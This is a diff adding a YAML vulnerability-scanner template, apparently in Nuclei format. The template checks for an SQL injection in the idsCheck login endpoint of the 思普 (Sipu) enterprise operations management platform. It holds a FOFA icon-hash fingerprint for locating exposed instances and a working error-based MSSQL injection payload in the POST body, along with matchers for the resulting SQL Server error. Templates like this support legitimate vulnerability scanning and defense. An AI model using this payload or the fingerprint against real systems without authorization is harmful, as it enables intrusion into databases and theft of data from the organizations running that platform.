@@ -1,0 +1,34 @@
+id: poc-yaml-xspinfo-eomp-idscheck-sqli
+info:
+  name: 思普企业运营管理平台 idsCheck SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: 思普企业运营管理平台
+    fofa: icon_hash="-403479360"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "/IdsCenter/idsCheck?p=apilogin"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: |
+      seqid=1%27+AND+6884+IN+%28SELECT+%28sys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2c%27{{t1}}%27%29%29%29%29--+cxaC&datasource=EOMP1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "在将 nvarchar 值"
+          - "0x{{t2}}"
+          - "转换成数据类型 int 时失败"
+          - "SQL Server"
+        part: body
